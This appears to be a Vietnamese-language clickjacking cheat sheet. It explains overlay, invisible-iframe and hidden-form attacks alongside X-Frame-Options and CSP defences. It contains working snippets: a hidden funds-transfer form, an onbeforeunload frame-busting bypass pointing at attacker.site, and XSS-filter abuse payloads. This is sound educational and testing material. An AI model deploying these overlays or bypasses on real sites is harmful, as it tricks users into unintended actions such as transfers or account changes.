# Clickjacking

> Clickjacking là một loại lỗ hổng bảo mật web trong đó một trang web độc hại đánh lừa người dùng nhấp vào một thứ gì đó khác với những gì họ tưởng là đang nhấp vào, có khả năng khiến người dùng thực hiện các hành động ngoài ý muốn mà họ không hề hay biết hoặc không đồng ý. Người dùng bị lừa thực hiện đủ loại hành động ngoài ý muốn như nhập mật khẩu, nhấp vào nút 'Xóa tài khoản của tôi', thích một bài đăng, xóa một bài đăng, bình luận trên một blog. Nói cách khác, tất cả các hành động mà một người dùng bình thường có thể thực hiện trên một trang web hợp pháp đều có thể được thực hiện bằng clickjacking.

## Tóm tắt

* [Công cụ](#tools)
* [Phương pháp](#methodology)
    * [UI Redressing](#ui-redressing)
    * [Invisible Frames](#invisible-frames)
    * [Button/Form Hijacking](#buttonform-hijacking)
    * [Các phương pháp thực thi](#execution-methods)
* [Biện pháp phòng ngừa](#preventive-measures)
    * [Triển khai Header X-Frame-Options](#implement-x-frame-options-header)
    * [Content Security Policy (CSP)](#content-security-policy-csp)
    * [Vô hiệu hóa JavaScript](#disabling-javascript)
* [Sự kiện OnBeforeUnload](#onbeforeunload-event)
* [Bộ lọc XSS](#xss-filter)
    * [Bộ lọc XSS của IE8](#ie8-xss-filter)
    * [Bộ lọc XSSAuditor của Chrome 4.0](#chrome-40-xssauditor-filter)
* [Thử thách](#challenge)
* [Labs](#labs)
* [Tài liệu tham khảo](#references)

## Công cụ

* [portswigger/burp](https://portswigger.net/burp)
* [zaproxy/zaproxy](https://github.com/zaproxy/zaproxy)
* [machine1337/clickjack](https://github.com/machine1337/clickjack)

## Phương pháp

### UI Redressing

UI Redressing là một kỹ thuật Clickjacking trong đó kẻ tấn công phủ một phần tử giao diện (UI) trong suốt lên trên một trang web hoặc ứng dụng hợp pháp. Phần tử UI trong suốt này chứa nội dung hoặc hành động độc hại được ẩn khỏi tầm mắt người dùng. Bằng cách thao túng độ trong suốt và vị trí của các phần tử, kẻ tấn công có thể đánh lừa người dùng tương tác với nội dung ẩn, khiến họ tin rằng mình đang tương tác với giao diện hiển thị.

* **Cách UI Redressing hoạt động:**
    * Phủ phần tử trong suốt: Kẻ tấn công tạo ra một phần tử HTML trong suốt (thường là một `<div>`) bao phủ toàn bộ vùng hiển thị của một trang web hợp pháp. Phần tử này được làm trong suốt bằng các thuộc tính CSS như `opacity: 0;`.
    * Định vị và phân lớp: Bằng cách thiết lập các thuộc tính CSS như `position: absolute; top: 0; left: 0;`, phần tử trong suốt được định vị để bao phủ toàn bộ viewport. Vì nó trong suốt nên người dùng không nhìn thấy nó.
    * Tương tác gây hiểu lầm: Kẻ tấn công đặt các phần tử lừa đảo bên trong container trong suốt, chẳng hạn như nút giả, liên kết giả, hoặc form giả. Các phần tử này thực hiện hành động khi được nhấp, nhưng người dùng không nhận biết được sự tồn tại của chúng do lớp UI trong suốt phủ lên trên.
    * Tương tác của người dùng: Khi người dùng tương tác với giao diện hiển thị, họ vô tình tương tác với các phần tử ẩn do lớp phủ trong suốt. Sự tương tác này có thể dẫn đến các hành động ngoài ý muốn hoặc các thao tác trái phép.

```html
<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
  <a href="malicious-link">Click me</a>
</div>
```

### Invisible Frames

Invisible Frames là một kỹ thuật Clickjacking trong đó kẻ tấn công sử dụng các iframe ẩn để đánh lừa người dùng tương tác với nội dung từ một trang web khác mà không hề hay biết. Các iframe này được làm cho vô hình bằng cách đặt kích thước của chúng về 0 (height: 0; width: 0;) và loại bỏ đường viền (border: none;). Nội dung bên trong các frame vô hình này có thể là độc hại, chẳng hạn như form phishing, tải xuống malware, hoặc bất kỳ hành động gây hại nào khác.

* **Cách Invisible Frames hoạt động:**
    * Tạo IFrame ẩn: Kẻ tấn công chèn một phần tử `<iframe>` vào một trang web, đặt kích thước của nó về 0 và loại bỏ đường viền, khiến nó vô hình đối với người dùng.

      ```html
      <iframe src="malicious-site" style="opacity: 0; height: 0; width: 0; border: none;"></iframe>
      ```

    * Tải nội dung độc hại: Thuộc tính src của iframe trỏ đến một trang web hoặc tài nguyên độc hại do kẻ tấn công kiểm soát. Nội dung này được tải một cách âm thầm mà người dùng không hề hay biết vì iframe là vô hình.
    * Tương tác của người dùng: Kẻ tấn công phủ các phần tử hấp dẫn lên trên iframe vô hình, khiến người dùng tưởng như mình đang tương tác với giao diện hiển thị. Ví dụ, kẻ tấn công có thể đặt một nút trong suốt lên trên iframe vô hình. Khi người dùng nhấp vào nút, về bản chất họ đang nhấp vào nội dung ẩn bên trong iframe.
    * Hành động ngoài ý muốn: Vì người dùng không biết đến sự tồn tại của iframe vô hình, các tương tác của họ có thể dẫn đến những hành động ngoài ý muốn, chẳng hạn như gửi form, nhấp vào các liên kết độc hại, hoặc thậm chí thực hiện các giao dịch tài chính mà không có sự đồng ý của họ.

### Button/Form Hijacking

Button/Form Hijacking là một kỹ thuật Clickjacking trong đó kẻ tấn công đánh lừa người dùng tương tác với các nút/form vô hình hoặc ẩn, dẫn đến các hành động ngoài ý muốn trên một trang web hợp pháp. Bằng cách phủ các phần tử lừa đảo lên trên các nút hoặc form hiển thị, kẻ tấn công có thể thao túng các tương tác của người dùng để thực hiện các hành động độc hại mà người dùng không hề hay biết.

* **Cách Button/Form Hijacking hoạt động:**
    * Giao diện hiển thị: Kẻ tấn công trình bày một nút hoặc form hiển thị cho người dùng, khuyến khích họ nhấp hoặc tương tác với nó.

    ```html
    <button onclick="submitForm()">Click me</button>
    ```

    * Lớp phủ vô hình: Kẻ tấn công phủ nút hoặc form hiển thị này bằng một phần tử vô hình hoặc trong suốt chứa một hành động độc hại, chẳng hạn như gửi một form ẩn.

    ```html
    <form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
    <!-- Hidden form fields -->
    </form>
    ```

    * Tương tác gây hiểu lầm: Khi người dùng nhấp vào nút hiển thị, họ vô tình tương tác với form ẩn do lớp phủ vô hình. Form được gửi đi, có khả năng gây ra các hành động trái phép hoặc rò rỉ dữ liệu.

    ```html
    <button onclick="submitForm()">Click me</button>
    <form action="legitimate-site" method="POST" id="hidden-form">
      <!-- Hidden form fields -->
    </form>
    <script>
      function submitForm() {
        document.getElementById('hidden-form').submit();
      }
    </script>
    ```

### Các phương pháp thực thi

* Tạo Form ẩn: Kẻ tấn công tạo một form ẩn chứa các trường input độc hại, nhắm vào một hành động dễ bị tổn thương trên trang web của nạn nhân. Form này luôn ẩn khỏi tầm mắt người dùng.

```html
  <form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="action" value="transfer-funds">
  </form>
```

* Phủ phần tử hiển thị: Kẻ tấn công phủ một phần tử hiển thị (nút hoặc form) lên trang độc hại của mình, khuyến khích người dùng tương tác với nó. Khi người dùng nhấp vào phần tử hiển thị, họ vô tình kích hoạt việc gửi form ẩn.

```js
  function submitForm() {
    document.getElementById('hidden-form').submit();
  }
```

## Biện pháp phòng ngừa

### Triển khai Header X-Frame-Options

Triển khai header X-Frame-Options với chỉ thị DENY hoặc SAMEORIGIN để ngăn trang web của bạn bị nhúng vào bên trong một iframe mà không có sự cho phép của bạn.

```apache
Header always append X-Frame-Options SAMEORIGIN
```

### Content Security Policy (CSP)

Sử dụng CSP để kiểm soát các nguồn mà từ đó nội dung có thể được tải trên trang web của bạn, bao gồm script, style, và frame. Định nghĩa một chính sách CSP chặt chẽ để ngăn chặn việc đóng khung (framing) trái phép và tải các tài nguyên bên ngoài.
Ví dụ trong thẻ meta HTML:

```html
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self';">
```

### Vô hiệu hóa JavaScript

* Vì các loại biện pháp bảo vệ phía client này dựa vào mã "frame busting" bằng JavaScript, nếu nạn nhân tắt JavaScript hoặc kẻ tấn công có thể vô hiệu hóa mã JavaScript, trang web sẽ không có bất kỳ cơ chế bảo vệ nào chống lại clickjacking.
* Có ba kỹ thuật vô hiệu hóa có thể được sử dụng với frame:
    * Frame bị hạn chế với Internet Explorer: Bắt đầu từ IE6, một frame có thể có thuộc tính "security" mà, nếu được đặt giá trị "restricted", đảm bảo rằng mã JavaScript, ActiveX controls, và chuyển hướng đến các trang khác sẽ không hoạt động trong frame.

    ```html
    <iframe src="http://target site" security="restricted"></iframe>
    ```

    * Thuộc tính Sandbox: với HTML5 có một thuộc tính mới gọi là "sandbox". Nó cho phép áp dụng một tập hợp các hạn chế lên nội dung được tải vào iframe. Tại thời điểm này, thuộc tính này chỉ tương thích với Chrome và Safari.

    ```html
    <iframe src="http://target site" sandbox></iframe>
    ```

## Sự kiện OnBeforeUnload

* Sự kiện `onBeforeUnload` có thể được sử dụng để né tránh mã frame busting. Sự kiện này được gọi khi mã frame busting muốn phá hủy iframe bằng cách tải URL trong toàn bộ trang web chứ không chỉ trong iframe. Hàm xử lý trả về một chuỗi được nhắc hiển thị cho người dùng để yêu cầu xác nhận xem họ có muốn rời khỏi trang hay không. Khi chuỗi này được hiển thị cho người dùng, họ có khả năng sẽ hủy điều hướng, đánh bại nỗ lực frame busting của mục tiêu.

* Kẻ tấn công có thể sử dụng cuộc tấn công này bằng cách đăng ký một sự kiện unload trên trang cấp cao nhất bằng đoạn mã ví dụ sau:

```html
<h1>www.fictitious.site</h1>
<script>
    window.onbeforeunload = function()
    {
        return " Do you want to leave fictitious.site?";
    }
</script>
<iframe src="http://target site">
```

* Kỹ thuật trước đó đòi hỏi sự tương tác của người dùng, nhưng cùng một kết quả có thể đạt được mà không cần nhắc người dùng. Để làm điều này, kẻ tấn công phải tự động hủy yêu cầu điều hướng đang đến trong một trình xử lý sự kiện onBeforeUnload bằng cách liên tục gửi (ví dụ mỗi mili giây) một yêu cầu điều hướng đến một trang web phản hồi bằng header _"HTTP/1.1 204 No Content"_.

Trang 204:

```php
<?php
    header("HTTP/1.1 204 No Content");
?>
```

Trang của kẻ tấn công:

```js
<script>
    var prevent_bust = 0;
    window.onbeforeunload = function() {
        prevent_bust++;
    };
    setInterval(
        function() {
            if (prevent_bust > 0) {
                prevent_bust -= 2;
                window.top.location = "http://attacker.site/204.php";
            }
        }, 1);
</script>
<iframe src="http://target site">
```

## Bộ lọc XSS

### Bộ lọc XSS của IE8

Bộ lọc này có khả năng nhìn thấy tất cả các tham số của mỗi request và response đi qua trình duyệt web và so sánh chúng với một tập hợp các biểu thức chính quy (regular expressions) để tìm kiếm các nỗ lực tấn công XSS phản chiếu (reflected). Khi bộ lọc xác định một cuộc tấn công XSS có thể xảy ra, nó vô hiệu hóa tất cả các script inline trong trang, bao gồm cả script frame busting (điều tương tự cũng có thể được thực hiện với các script bên ngoài). Vì lý do này, kẻ tấn công có thể tạo ra một kết quả dương tính giả (false positive) bằng cách chèn phần đầu của script frame busting vào các tham số của request.

```html
<script>
    if ( top != self )
    {
        top.location=self.location;
    }
</script>
```

Góc nhìn của kẻ tấn công:

```html
<iframe src=”http://target site/?param=<script>if”>
```

### Bộ lọc XSSAuditor của Chrome 4.0

Nó có hành vi hơi khác so với bộ lọc XSS của IE8, thực tế với bộ lọc này, kẻ tấn công có thể vô hiệu hóa một "script" bằng cách chuyển mã của nó vào một tham số của request. Điều này cho phép trang đóng khung (framing page) nhắm mục tiêu cụ thể vào một đoạn mã duy nhất chứa mã frame busting, để nguyên các đoạn mã khác.

Góc nhìn của kẻ tấn công:

```html
<iframe src=”http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D”>
```

## Thử thách

Kiểm tra đoạn mã sau:

```html
<div style="position: absolute; opacity: 0;">
  <iframe src="https://legitimate-site.com/login" width="500" height="500"></iframe>
</div>
<button onclick="document.getElementsByTagName('iframe')[0].contentWindow.location='malicious-site.com';">Click me</button>
```

Xác định lỗ hổng Clickjacking trong đoạn mã này. Xác định cách iframe ẩn được sử dụng để khai thác hành động của người dùng khi họ nhấp vào nút, dẫn họ đến một trang web độc hại.

## Labs

* [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
* [OWASP Client Side Clickjacking Test](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/09-Testing_for_Clickjacking)

## Tài liệu tham khảo

* [Clickjacker.io - Saurabh Banawar - 10 tháng 5, 2020](https://web.archive.org/web/20200510214313/https://clickjacker.io/)
* [Clickjacking - Gustav Rydstedt - 28 tháng 4, 2020](https://web.archive.org/web/20200428022051/https://owasp.org/www-community/attacks/Clickjacking)
* [Synopsys Clickjacking - BlackDuck - 29 tháng 11, 2019](https://web.archive.org/web/20240917212838/https://www.synopsys.com/glossary/what-is-clickjacking.html)
* [Web-Security Clickjacking - PortSwigger - 12 tháng 10, 2019](https://web.archive.org/web/20260215062230/https://portswigger.net/web-security/clickjacking)
